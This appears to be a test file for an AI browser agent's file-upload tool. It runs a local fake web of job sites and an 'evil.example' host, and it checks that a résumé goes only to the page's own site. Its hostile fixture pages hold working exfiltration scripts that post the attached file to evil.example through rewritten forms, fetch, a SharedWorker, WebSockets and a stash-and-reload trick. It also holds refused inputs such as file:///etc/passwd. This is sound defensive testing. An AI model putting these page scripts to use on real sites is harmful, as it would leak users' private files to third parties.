// The `upload` browser tool (docs/HYBRID-AGENT-SPEC.md S2 increment 4; threats B7 "uploading the wrong file", B12 "the résumé goes somewhere other than the employer"): a real Chromium through the real gate to a local "internet"
// (one server answering for jobs.example, apply.jobs.example, ats.example and evil.example, counting what reaches each) with a designated résumé. The file goes only where the page's form says it goes AND that is the page's
// own site; the check is made before the file is attached, again after, and a second time on the network while the file is attached (a page can rewrite its form, or send the file with a script, after any check).
// Each refusal has a control (the same page shape that is allowed) and a counter on the far side.
//   npm run build && npm run test:upload-form
import { createServer } from "node:http";
import { WebSocketServer } from "ws";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import assert from "node:assert";
import { BrowserSessionManager, __testHandlers } from "../dist/browser-tools.js";
import { liveBrowserPolicy, testPolicy } from "../dist/browser-policy.js";
import { parseAllowances } from "../dist/allowances.js";
import { parseUploads } from "../dist/uploads.js";
import { EventBus } from "../dist/bus.js";

const MARK = "RESUME-BYTES-77";
const dir = mkdtempSync(join(tmpdir(), "upload-form-"));
const resumePath = join(dir, "resume.pdf");
writeFileSync(resumePath, `%PDF-1.4 ${MARK} a résumé`);
const uploads = parseUploads({ files: { resume: resumePath } }).value;

const hits = {}; // host -> ["GET /x", "POST /apply (file)"]
let P = 0;
const A = (path = "/") => `http://ats.example:${P}${path}`;
const page = (res, title, body) => { res.writeHead(200, { "content-type": "text/html" }); res.end(`<!doctype html><title>${title}</title>${body}`); };
const FILE = `<input type="file" id="cv" name="cv">`;
const WATCH = `<script>document.getElementById("cv")?.addEventListener("change", () => { window.sawChange = true; });</script>`;
const bareForm = (action, extra = "", inner = "") => `<form id="f" method="post" enctype="multipart/form-data" action="${action}" ${extra}>${FILE}<button id="go">go</button>${inner}</form>`;
const form = (action, extra = "", inner = "") => bareForm(action, extra, inner) + WATCH;
const server = createServer((req, res) => {
  const host = String(req.headers.host).split(":")[0];
  const u = new URL(req.url, "http://x");
  const chunks = [];
  req.on("data", (c) => chunks.push(c));
  req.on("end", () => {
    const body = Buffer.concat(chunks);
    (hits[host] ??= []).push(`${req.method} ${u.pathname}${req.method === "POST" ? (body.includes(MARK) ? " (file)" : " (no file)") : ""}`);
    if (req.method === "POST") {
      if (host === "jobs.example" || host === "apply.jobs.example") { res.writeHead(303, { location: `http://${host}:${P}/thanks` }); return res.end(); }
      return page(res, "ATS-GOT-IT", "<h1>ATS-GOT-IT</h1>");
    }
    if (host === "ats.example") {
      if (u.pathname === "/frame-form") return page(res, "ATS frame", form("/collect"));
      if (u.pathname === "/nest") return page(res, "ATS nest", `<iframe src="http://apply.jobs.example:${P}/frame-form"></iframe>`);
      if (u.pathname === "/plain-form") return page(res, "ATS plain", `<form id="p" method="post" action="/collect"><input name="x" value="1"><button id="pgo">send</button></form>`);
      return page(res, "ATS", "<h1>ATS</h1>");
    }
    if (host === "apply.jobs.example" && u.pathname === "/frame-form") return page(res, "Apply frame", form("/apply"));
    if (host === "evil.example") return page(res, "EVIL", "<h1>EVIL</h1>");
    const J = `http://jobs.example:${P}`;
    switch (u.pathname) {
      case "/thanks": return page(res, "Thanks", `<h1>THANKS-FOR-APPLYING</h1><button id="t" onclick="fetch('${A("/collect")}', {method: 'POST', mode: 'no-cors', body: 'x'})">tell ats</button>`);
      case "/good": return page(res, "Good", form("/apply"));
      case "/absolute": return page(res, "Abs", form(`${J}/apply`));
      case "/subdomain": return page(res, "Sub", form(`http://apply.jobs.example:${P}/apply`));
      case "/evil-action": return page(res, "EvilAction", form(`http://evil.example:${P}/steal`));
      case "/other-platform": return page(res, "Other", form(A("/collect")));
      case "/javascript-action": return page(res, "JS", form("javascript:void(0)"));
      case "/noform": return page(res, "NoForm", `${FILE}<button id="go" onclick="/* a script would send it */">send</button>`);
      case "/get-form": return page(res, "Get", form("/apply").replace('method="post"', 'method="get"'));
      case "/formaction": return page(res, "FormAction", form("/apply", "", `<button id="go2" formaction="${A("/collect")}">alt</button>`));
      case "/target-blank": return page(res, "Blank", form("/apply", 'target="_blank"'));
      case "/disabled": return page(res, "Disabled", form("/apply").replace(FILE, `<input type="file" id="cv" name="cv" disabled>`));
      case "/notfile": return page(res, "NotFile", form("/apply").replace(FILE, `<input type="text" id="cv" name="cv">`));
      case "/clobber-evil": return page(res, "ClobberEvil", form(`http://evil.example:${P}/steal`, "", `<input name="action" value="/apply">`));
      case "/clobber-good": return page(res, "ClobberGood", form("/apply", "", `<input name="action" value="${A("/collect")}"><input name="elements" value="x"><input name="method" value="get">`));
      case "/shadow-evil": return page(res, "ShadowEvil", `<div id="host"></div><script>const r = document.getElementById("host").attachShadow({mode:"open"}); r.innerHTML = ${JSON.stringify(bareForm(A("/collect")))};</script>`);
      case "/shadow-good": return page(res, "ShadowGood", `<div id="host"></div><script>const r = document.getElementById("host").attachShadow({mode:"open"}); r.innerHTML = ${JSON.stringify(bareForm(`${J}/apply`))};</script>`);
      case "/noaction": return page(res, "NoAction", `<form id="f" method="post" enctype="multipart/form-data">${FILE}<button id="go">go</button></form>${WATCH}`);
      case "/base-empty-action": return page(res, "BaseEmpty", `<base href="http://evil.example:${P}/">${form("")}`);
      case "/base-evil": return page(res, "BaseEvil", `<base href="http://evil.example:${P}/">${form("/apply")}`);
      case "/tamper-form": return page(res, "TamperForm", `<form id="d" method="post" action="/apply"></form>${form(`http://evil.example:${P}/steal`)}<script>Object.defineProperty(document.getElementById("cv"), "form", { get: () => document.getElementById("d") });</script>`);
      case "/tamper-attr": return page(res, "TamperAttr", `${form(`http://evil.example:${P}/steal`)}<script>document.getElementById("f").getAttribute = () => "/apply";</script>`);
      case "/clobber-elements": return page(res, "ClobberElements", form("/apply", "", `<input name="elements" value="x"><button id="go2" formaction="${A("/collect")}">alt</button>`));
      case "/formaction-type-button": return page(res, "FormActionButton", form("/apply", "", `<button type="button" id="go2" formaction="${A("/collect")}">alt</button>`));
      case "/formaction-image": return page(res, "FormActionImage", form("/apply", "", `<input type="image" id="go2" formaction="${A("/collect")}">`));
      case "/formtarget": return page(res, "FormTarget", form("/apply", "", `<button id="go2" formtarget="_blank">alt</button>`));
      case "/target-self": return page(res, "TargetSelf", form("/apply", 'target="_self"'));
      case "/swap-on-change": return page(res, "SwapOnChange", `${form("/apply")}<script>document.getElementById("cv").addEventListener("change", () => document.getElementById("f").setAttribute("action", ${JSON.stringify(A("/collect"))}));</script>`);
      case "/nomethod": return page(res, "NoMethod", form("/apply").replace('method="post"', ""));
      case "/invalid-action": return page(res, "InvalidAction", form("http://[bad"));
      case "/tamper-base": return page(res, "TamperBase", `<base href="http://evil.example:${P}/">${form("/apply")}<script>Object.defineProperty(document, "baseURI", { get: () => location.href });</script>`);
      case "/frame-nested": return page(res, "FrameNested", `<h1>HOST</h1><iframe src="${A("/nest")}"></iframe>`);
      case "/frame-third": return page(res, "FrameThird", `<h1>HOST</h1><iframe src="${A("/frame-form")}"></iframe>`);
      case "/frame-same": return page(res, "FrameSame", `<h1>HOST</h1><iframe src="http://apply.jobs.example:${P}/frame-form"></iframe>`);
      case "/swap": return page(res, "Swap", `${form("/apply")}<script>window.swap = () => document.getElementById("f").setAttribute("action", ${JSON.stringify(A("/collect"))});</script>`);
      case "/xhr": return page(res, "Xhr", `${form("/apply")}<button id="x" type="button" onclick="fetch('${A("/collect")}', {method: 'POST', mode: 'no-cors', body: new FormData(document.getElementById('f'))})">send</button>`);
      case "/swk.js": res.writeHead(200, { "content-type": "text/javascript" }); return res.end(`onconnect = (c) => { const p = c.ports[0]; p.onmessage = (e) => { fetch("http://evil.example:${P}/via-shared-worker", { method: "POST", mode: "no-cors", body: e.data }); }; };`);
      case "/shared-leak": return page(res, "SharedLeak", `${form("/apply")}<script>const sw = new SharedWorker("/swk.js"); document.getElementById("cv").addEventListener("change", (ev) => sw.port.postMessage(ev.target.files[0]));</script>`);
      case "/ws-leak": return page(res, "WsLeak", `${form("/apply")}<script>window.wsTo = (u, path) => { const s = new WebSocket(u + path); s.onopen = async () => { s.send(await document.getElementById("cv").files[0].text()); }; };</script>`);
      case "/stash-reload": return page(res, "StashReload", `${form("/apply")}<script>
        if (sessionStorage.getItem("stash")) { addEventListener("DOMContentLoaded", () => setTimeout(() => fetch("http://evil.example:${P}/via-reload", { method: "POST", mode: "no-cors", body: sessionStorage.getItem("stash") }), 200)); }
        document.getElementById("cv").addEventListener("change", (ev) => { const r = new FileReader(); r.onload = () => { sessionStorage.setItem("stash", String(r.result)); setTimeout(() => location.reload(), 300); }; r.readAsText(ev.target.files[0]); });
      </script>`);
      case "/popup-host": return page(res, "PopupHost", `${form("/apply")}<button id="pop" type="button" onclick="window.open('${J}/popup-form')">pop</button>`);
      case "/popup-form": return page(res, "PopupForm", `<form id="p" method="post" action="${A("/collect")}"><input name="x" value="1"><button id="pgo">send</button></form>`);
      default: return page(res, "Jobs", "<h1>Jobs home</h1>");
    }
  });
});
const wss = new WebSocketServer({ noServer: true });
server.on("upgrade", (req, sock, head) => {
  const host = String(req.headers.host).split(":")[0];
  const path = new URL(req.url, "http://x").pathname;
  (hits[host] ??= []).push(`UPGRADE ${path}`);
  wss.handleUpgrade(req, sock, head, (c) => c.on("message", (m) => (hits[host] ??= []).push(`WSMSG ${path} ${String(m).includes(MARK) ? "(file)" : "(no file)"}`)));
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
P = server.address().port;

const allowances = parseAllowances({ allow: ["jobs.example", "ats.example"], platforms: { jobs: ["jobs.example"] } }).value;
const resolve = async (host) => (host.endsWith(".example") ? ["127.0.0.1"] : (() => { throw new Error("ENOTFOUND"); })());
const policy = liveBrowserPolicy(allowances, { isPublic: (ip) => ip === "127.0.0.1", resolve, extraPorts: [P] });
const J = (path = "/") => `http://jobs.example:${P}${path}`;
const settle = (ms) => new Promise((r) => setTimeout(r, ms));

// 0. The destination rule on its own, with no browser
{
  const ok = (v) => v.ok === true;
  assert.ok(ok(policy.destination(J("/a"), J("/apply"))) && ok(policy.destination(J("/a"), `http://apply.jobs.example:${P}/x`)), "the page's own site and its subdomain");
  const other = policy.destination(J("/a"), A("/collect"));
  assert.ok(!ok(other) && /ats\.example.*not to the site of the page/.test(other.reason), JSON.stringify(other));
  const off = policy.destination(J("/a"), `http://evil.example:${P}/x`);
  assert.ok(!ok(off) && /not on the allowances list/.test(off.reason), JSON.stringify(off));
  const unlistedPage = policy.destination(`http://evil.example:${P}/a`, J("/apply"));
  assert.ok(!ok(unlistedPage) && /page the file was attached on is not on the list/.test(unlistedPage.reason), JSON.stringify(unlistedPage));
  for (const bad of ["javascript:void(0)", "data:text/html,x", "blob:http://jobs.example/x", "file:///etc/passwd", "ftp://jobs.example/", "not a url", "about:blank", ""]) assert.ok(!ok(policy.destination(J("/a"), bad)), `destination ${bad}`);
  assert.ok(!ok(policy.destination(J("/a"), `http://user:pw@jobs.example:${P}/x`)), "a destination with credentials");  // devskill:allow (a made-up credential in a test URL, refused by the rule under test)
  // TEST mode: the page's own server, exactly
  assert.ok(ok(testPolicy.destination("http://127.0.0.1:5000/a", "http://127.0.0.1:5000/b")));
  for (const bad of ["http://127.0.0.1:5001/b", "http://localhost:5000/b", "https://127.0.0.1:5000/b", "http://example.com/b", "javascript:1", "not a url"]) assert.ok(!ok(testPolicy.destination("http://127.0.0.1:5000/a", bad)), `TEST destination ${bad}`);
  assert.ok(!ok(testPolicy.destination("about:blank", "http://127.0.0.1:5000/b")));
  assert.ok(!ok(testPolicy.destination("data:text/html,a", "data:text/html,b")) && !ok(testPolicy.destination("about:blank", "about:blank")), "two non-web addresses with the same opaque origin were taken for the same site");
  console.log("[ok] the destination rule: LIVE allows the page's own site and its subdomains, not another listed platform, an unlisted host, a page that is not listed, or a non-web address; TEST allows the page's own server only");
}

const bus = new EventBus();
const sessions = new BrowserSessionManager({ policy, uploads });
const h = __testHandlers({ runId: "uf", bus, sessions, artifactDir: mkdtempSync(join(tmpdir(), "uf-art-")) });
const call = async (name, args = {}) => {
  try { const r = await h[name].handler(args, {}); return { text: r.content.map((c) => c.text ?? "").join("\n"), isError: !!r.isError }; }
  catch (e) { return { text: "THREW " + e.message, isError: true }; }
};
const live = () => sessions.get("uf");
const fileCount = (sel = "#cv") => live().page.evaluate((s) => { const el = document.querySelector(s) ?? document.getElementById("host")?.shadowRoot?.querySelector(s); return el ? el.files.length : -1; }, sel);
const fresh = async () => { await sessions.close("uf", bus, "completed").catch(() => {}); for (const k of Object.keys(hits)) delete hits[k]; };
const posts = (host) => (hits[host] ?? []).filter((x) => x.startsWith("POST"));
const upload = (args) => call("upload", { file: "resume", ...args });
const refused = async (path, why, label, args = { selector: "#cv" }) => {
  await fresh();
  await call("open", { url: J(path) });
  const r = await upload(args);
  assert.ok(r.isError && /Refused/.test(r.text) && why.test(r.text), `${label}: ${r.text}`);
  assert.ok(!r.text.includes(dir), `${label}: the answer holds the user's directory`);
  assert.strictEqual(await fileCount(args.selector ?? "#cv").catch(() => 0), 0, `${label}: a file was attached anyway`);
  assert.ok(!(await live().page.evaluate(() => window.sawChange === true).catch(() => false)), `${label}: the page was shown the file (its change event fired) before the refusal`);
};
const refOfFileField = async () => {
  const seen = (await call("inspect")).text;
  const found = seen.split("\n").filter((l) => /file-input/.test(l)).map((l) => /\[(s\d+e\d+)\]/.exec(l)?.[1]).filter(Boolean);
  assert.ok(found.length, `inspect shows no file field (it should say file-input, not textbox):\n${seen.slice(0, 800)}`);
  return found[0];
};

// 1. Control: a résumé goes to the form of the page it is on, and the far side receives it
{
  await fresh();
  await call("open", { url: J("/good") });
  const r = await upload({ selector: "#cv" });
  assert.ok(!r.isError && /Attached "resume" \(resume\.pdf, 1 KB\)/.test(r.text) && /sends to jobs\.example/.test(r.text), r.text);
  assert.ok(!r.text.includes(dir), "the answer holds the user's directory");
  assert.strictEqual(await fileCount(), 1);
  await call("click", { selector: "#go" });
  await settle(800);
  assert.deepStrictEqual(posts("jobs.example"), ["POST /apply (file)"], `the form did not reach its own server: ${JSON.stringify(hits)}`);
  assert.ok(/THANKS-FOR-APPLYING/.test((await call("text")).text), "the thank-you page was not reached");
  // the thank-you page is a new document on the same site: the hold stays (a page that read the file can keep it across a reload, adversary round 3 A55), so its own script cannot post to another site until the tab leaves
  await call("click", { selector: "#t" });
  await settle(600);
  assert.deepStrictEqual(posts("ats.example"), [], `the hold ended with the first document, and a page that kept the file's bytes could send them on: ${JSON.stringify(hits)}`);
  for (const ok of ["/absolute", "/subdomain", "/clobber-good", "/shadow-good", "/noaction", "/base-empty-action", "/formaction-type-button", "/target-self"]) {
    await fresh();
    await call("open", { url: J(ok) });
    const a = await upload({ selector: "#cv" });
    assert.ok(!a.isError && /Attached/.test(a.text), `${ok} (control): ${a.text}`);
  }
  console.log("[ok] a designated file is attached to the form of the page it is on and the far side receives it (an absolute action, a subdomain, a form holding inputs named action and elements, a form in an open shadow root, a form with no action, an empty action under a hostile <base>, a button that is not a submit button with its own formaction, and target=_self are the same)");
}

// 2. Refusals, each with the far side's counter: nothing is attached and nothing reaches the wrong host
{
  await refused("/evil-action", /form sends to .*evil\.example.*not on the allowances list.*Nothing was attached/, "an action on an unlisted host");
  assert.deepStrictEqual(hits["evil.example"] ?? [], [], "the unlisted host heard from the browser");
  await refused("/other-platform", /form sends to .*ats\.example.*not to the site of the page/, "an action on another listed platform");
  await refused("/javascript-action", /form sends to/, "a javascript: action");
  await refused("/formaction", /form sends to .*ats\.example.*not to the site of the page/, "a submit button with its own formaction");
  await refused("/noform", /not inside a form.*by hand/, "a field outside any form");
  await refused("/get-form", /does not post/, "a form that does not post");
  await refused("/target-blank", /another window/, "a form that answers in another window");
  await refused("/disabled", /disabled/, "a disabled field");
  await refused("/notfile", /not a file field/, "a text field");
  await refused("/clobber-evil", /form sends to .*evil\.example/, "a form holding an input named action (the property would lie)");
  await refused("/shadow-evil", /form sends to .*ats\.example/, "a form in a shadow root that sends elsewhere");
  await refused("/base-evil", /form sends to .*evil\.example/, "a relative action under a hostile <base>");
  await refused("/tamper-form", /form sends to .*evil\.example/, "a field whose form property the page overrode");
  await refused("/tamper-attr", /form sends to .*evil\.example/, "a form whose getAttribute the page overrode");
  await refused("/clobber-elements", /form sends to .*ats\.example/, "a form holding an input named elements and a button with its own formaction");
  await refused("/formaction-image", /form sends to .*ats\.example/, "an image button with its own formaction");
  await refused("/formtarget", /another window/, "a submit button that answers in another window");
  await refused("/nomethod", /does not post/, "a form with no method (it defaults to get)");
  await refused("/invalid-action", /form sends to .*(only http and https|not a web address)/, "an action that is not an address");
  await refused("/tamper-base", /form sends to .*evil\.example/, "a relative action under a hostile <base> that the page hid from document.baseURI");
  console.log("[ok] refused, with nothing attached: an unlisted host, another listed platform, a javascript: action, a button's own formaction, a field outside a form, a form that does not post, one that answers in another window, a disabled field, a text field, a form that holds an input named action, a shadow-root form that sends elsewhere, a relative action under a hostile <base>, a field or form whose accessors the page overrode, an input named elements hiding a button's formaction, an image button's formaction, a button's formtarget, a form with no method, an action that is not an address, a base address the page hid");
}

// 3. Frames: the field must be in a frame from the page's own site
{
  await fresh();
  await call("open", { url: J("/frame-third") });
  await settle(500);
  let r = await upload({ ref: await refOfFileField() });
  assert.ok(r.isError && /in a frame from .*ats\.example.*not the page's own site/.test(r.text), `a field in another platform's frame: ${r.text}`);
  assert.deepStrictEqual(posts("ats.example"), []);
  await fresh();
  await call("open", { url: J("/frame-same") });
  await settle(500);
  r = await upload({ ref: await refOfFileField() });
  assert.ok(!r.isError && /Attached/.test(r.text) && /apply\.jobs\.example/.test(r.text), `a field in a frame of the page's own site (control): ${r.text}`);
  await fresh();
  await call("open", { url: J("/frame-nested") });
  await settle(800);
  r = await upload({ ref: await refOfFileField() });
  assert.ok(r.isError && /in a frame from .*ats\.example/.test(r.text), `a field of the page's own site inside a frame of another platform: ${r.text}`);
  console.log("[ok] a field in a frame from another platform is refused, and so is one of the page's own site that sits inside such a frame; one in a frame of the page's own site is allowed");
}

// 4. The page changes where its form sends after the check: the network holds the file to the page's own site
{
  await fresh();
  await call("open", { url: J("/swap") });
  // control: nothing attached, the page rewrites its form, the post goes where the page says (ats is on the list)
  await live().page.evaluate(() => window.swap());
  await call("click", { selector: "#go" });
  await settle(800);
  assert.deepStrictEqual(posts("ats.example"), ["POST /collect (no file)"], `control: the rewritten form did not post to the other host: ${JSON.stringify(hits)}`);

  await fresh();
  await call("open", { url: J("/swap") });
  assert.ok(!(await upload({ selector: "#cv" })).isError, "the file was not attached");
  await live().page.evaluate(() => window.swap());
  const clicked = await call("click", { selector: "#go" });
  await settle(800);
  assert.deepStrictEqual(posts("ats.example"), [], `the file reached another site after the page rewrote its form: ${JSON.stringify(hits)}`);
  assert.ok(/blocked by the upload rule.*ats\.example.*would send it elsewhere/.test(clicked.text + (await call("notices")).text), `the agent was not told: ${clicked.text}`);

  // a script can send the file as well as a form can
  await fresh();
  await call("open", { url: J("/xhr") });
  const sent = await call("click", { selector: "#x" });
  await settle(600);
  assert.deepStrictEqual(posts("ats.example"), ["POST /collect (no file)"], `control: the script's post did not arrive: ${JSON.stringify(hits)}\n${sent.text}\n${(await call("notices")).text}`);
  await fresh();
  await call("open", { url: J("/xhr") });
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  await call("click", { selector: "#x" });
  await settle(600);
  assert.deepStrictEqual(posts("ats.example"), [], `a script sent the attached file to another site: ${JSON.stringify(hits)}`);
  // a script that only changes the address is not a new document: the hold stays
  await fresh();
  await call("open", { url: J("/xhr") });
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  await live().page.evaluate(() => history.pushState(null, "", "/xhr?step=2"));
  await call("click", { selector: "#x" });
  await settle(600);
  assert.deepStrictEqual(posts("ats.example"), [], `a change of address ended the hold: ${JSON.stringify(hits)}`);
  await fresh();
  await call("open", { url: J("/xhr") });
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  // and the form's own site still works while the file is attached
  await call("click", { selector: "#go" });
  await settle(800);
  assert.deepStrictEqual(posts("jobs.example"), ["POST /apply (file)"], `the file could not be sent to its own site: ${JSON.stringify(hits)}`);
  // the page rewrites its form at the moment the file is attached (a change handler): the second look catches it, takes the file back, and ends the hold
  await fresh();
  await call("open", { url: J("/swap-on-change") });
  const late = await upload({ selector: "#cv" });
  assert.ok(late.isError && /the page changed where its form sends files while the file was being attached; the file was removed/.test(late.text) && /form sends to .*ats\.example/.test(late.text), `the change at attach time: ${late.text}`);
  assert.strictEqual(await fileCount(), 0, "the file was left on the field after the page rewrote its form");
  await call("click", { selector: "#go" });
  await settle(800);
  assert.deepStrictEqual(posts("ats.example"), ["POST /collect (no file)"], `the hold outlived the failed attach: ${JSON.stringify(hits)}`);

  // a plain read is never held: while a file is attached the page may still look things up elsewhere
  await fresh();
  await call("open", { url: J("/good") });
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  await live().page.evaluate((u) => fetch(u, { method: "HEAD", mode: "no-cors" }).catch(() => {}), A("/collect"));
  await settle(500);
  assert.ok((hits["ats.example"] ?? []).includes("HEAD /collect"), `a HEAD request was held while a file was attached: ${JSON.stringify(hits)}`);
  // OPTIONS is not a plain read: a script can give it a body (adversary round 3, A53), and the preflight a browser sends itself is not routed through the page at all
  await fresh();
  await call("open", { url: J("/good") });
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  await live().page.evaluate((u) => fetch(u, { method: "OPTIONS", mode: "no-cors", body: "stand-in for the file's bytes" }).catch(() => {}), A("/opt-body"));
  await live().page.evaluate((u) => new Promise((r) => { const x = new XMLHttpRequest(); x.open("OPTIONS", u); x.onloadend = r; x.send("stand-in for the file's bytes"); }), A("/opt-xhr"));
  await settle(600);
  assert.ok(!(hits["ats.example"] ?? []).some((x) => x.startsWith("OPTIONS")), `an OPTIONS request with a body left the page while a file was attached: ${JSON.stringify(hits)}`);
  console.log("[ok] while a file is attached, a form the page rewrote after the check and a script's fetch to another site are stopped on the network and the agent is told; the form's own site still receives the file");
}

// 4a. A page that read the file and reloads itself is still the page the file was attached on (adversary round 3, A55)
{
  await fresh();
  await call("open", { url: J("/stash-reload") });
  await settle(400);
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  await settle(1800);
  assert.ok(!(hits["evil.example"] ?? []).some((x) => x.includes("(file)")), `a page that kept the file across a reload sent it on: ${JSON.stringify(hits)}`);
  assert.ok((hits["jobs.example"] ?? []).filter((x) => x === "GET /stash-reload").length >= 2, `control: the page did not reload: ${JSON.stringify(hits)}`);
  console.log("[ok] a reload of the attached page does not end the hold: the bytes a page kept in its storage cannot be sent to another site by the next document");
}

// 4b. Channels that are not a request from the tab's own frame: a SharedWorker (no frame) and a WebSocket (never routed as a request) must not carry the attached file elsewhere (adversary round 3, A52, A54)
{
  const fileOnce = async (host, path) => { await settle(500); return (hits[host] ?? []).filter((x) => x.includes(path) && x.includes("(file)")); };
  await fresh();
  await call("open", { url: J("/shared-leak") });
  await settle(600);
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  await settle(1200);
  assert.deepStrictEqual(await fileOnce("evil.example", "/via-shared-worker"), [], `a shared worker sent the attached file to an unlisted host (SharedWorker should not exist): ${JSON.stringify(hits)}`);
  // control: without a file attached the same worker is not stopped by the hold (it still reaches nothing here, because evil.example is not listed, but the request is made)
  const wsUrl = (host, path) => `ws://${host}:${P}${path}`;
  // a WebSocket from the attached page to another LISTED platform
  await fresh();
  await call("open", { url: J("/ws-leak") });
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  await live().page.evaluate(([u, p]) => window.wsTo(u, p), [wsUrl("ats.example", ""), "/ws-other-platform"]);
  await settle(1200);
  assert.deepStrictEqual(await fileOnce("ats.example", "/ws-other-platform"), [], `a WebSocket carried the attached file to another listed platform: ${JSON.stringify(hits)}`);
  assert.ok(!(hits["ats.example"] ?? []).some((x) => x.startsWith("UPGRADE /ws-other-platform")), `the socket to another platform was opened: ${JSON.stringify(hits)}`);
  // control: the page's own site still gets a socket while the file is attached; and with nothing attached a socket to another listed host is untouched
  await live().page.evaluate(([u, p]) => window.wsTo(u, p), [wsUrl("jobs.example", ""), "/ws-own"]);
  await settle(1200);
  assert.ok((hits["jobs.example"] ?? []).includes("WSMSG /ws-own (file)"), `the page's own site could not be reached by socket while a file was attached: ${JSON.stringify(hits)}`);
  await fresh();
  await call("open", { url: J("/ws-leak") });
  await live().page.evaluate(([u, p]) => { const s = new WebSocket(u + p); s.onopen = () => s.send("hello"); }, [wsUrl("ats.example", ""), "/ws-no-file"]);
  await settle(1000);
  assert.ok((hits["ats.example"] ?? []).includes("WSMSG /ws-no-file (no file)"), `a socket to a listed host was stopped when no file was attached: ${JSON.stringify(hits)}`);
  console.log("[ok] while a file is attached, a shared worker (no frame) and a WebSocket to another listed platform are held to the page's own site; the own site's socket and sockets with nothing attached work");
}

// 5. A window the page opens is the page's doing; leaving for another site ends the hold
{
  await fresh();
  await call("open", { url: J("/popup-host") });
  await call("click", { selector: "#pop" });
  await settle(800);
  const popup = live().context.pages().find((p) => /popup-form/.test(p.url()));
  assert.ok(popup, "the popup did not open");
  await popup.click("#pgo");
  await settle(800);
  assert.deepStrictEqual(posts("ats.example"), ["POST /collect (no file)"], `control: the popup's form did not post: ${JSON.stringify(hits)}`);

  await fresh();
  await call("open", { url: J("/popup-host") });
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  await call("click", { selector: "#pop" });
  await settle(800);
  const popup2 = live().context.pages().find((p) => /popup-form/.test(p.url()));
  assert.ok(popup2, "the popup did not open");
  await popup2.click("#pgo");
  await settle(800);
  assert.deepStrictEqual(posts("ats.example"), [], `a window the page opened sent the attached file's page's form to another site: ${JSON.stringify(hits)}`);

  // once the tab is on another site the hold is gone: that site's own form works
  await fresh();
  await call("open", { url: J("/good") });
  assert.ok(!(await upload({ selector: "#cv" })).isError);
  await call("open", { url: A("/plain-form") });
  await call("click", { selector: "#pgo" });
  await settle(800);
  assert.deepStrictEqual(posts("ats.example"), ["POST /collect (no file)"], `the hold outlived the page it was made on: ${JSON.stringify(hits)}`);
  console.log("[ok] a window the attached page opens is held too; once the tab is on another site the hold is gone and that site's own form works");
}

// 6. Names, not paths; and a manager with nothing designated
{
  await fresh();
  await call("open", { url: J("/good") });
  for (const file of ["/etc/passwd", "../../etc/passwd", resumePath, "resume.pdf", "Resume", "nope"]) {
    const r = await call("upload", { selector: "#cv", file });
    assert.ok(r.isError && /Refused: /.test(r.text) && /not a designated file|NAME of a designated file/.test(r.text) && /Designated names: resume/.test(r.text) && !r.text.includes(dir), `${file}: ${r.text}`);
    assert.strictEqual(await fileCount(), 0, `${file}: a file was attached`);
  }
  const nothing = await call("upload", { selector: "#no-such-field", file: "resume" });
  assert.ok(nothing.isError, `a selector that matches nothing: ${nothing.text}`);
  const bare = new BrowserSessionManager({ policy });
  const h2 = __testHandlers({ runId: "uf2", bus, sessions: bare, artifactDir: mkdtempSync(join(tmpdir(), "uf-art2-")) });
  await h2.open.handler({ url: J("/good") }, {});
  const none = await h2.upload.handler({ selector: "#cv", file: "resume" }, {});
  const noneText = none.content.map((c) => c.text ?? "").join("\n");
  assert.ok(none.isError && /no files are designated for upload/.test(noneText), noneText);
  await bare.close("uf2", bus, "completed").catch(() => {});
  console.log("[ok] the tool takes a designated name: a path, a relative path, the real path, a file name and an unknown name are refused without echoing the directory; a manager with nothing designated attaches nothing");
}

await fresh();
console.log("\nALL UPLOAD-FORM TESTS PASSED");
server.close();
process.exit(0);
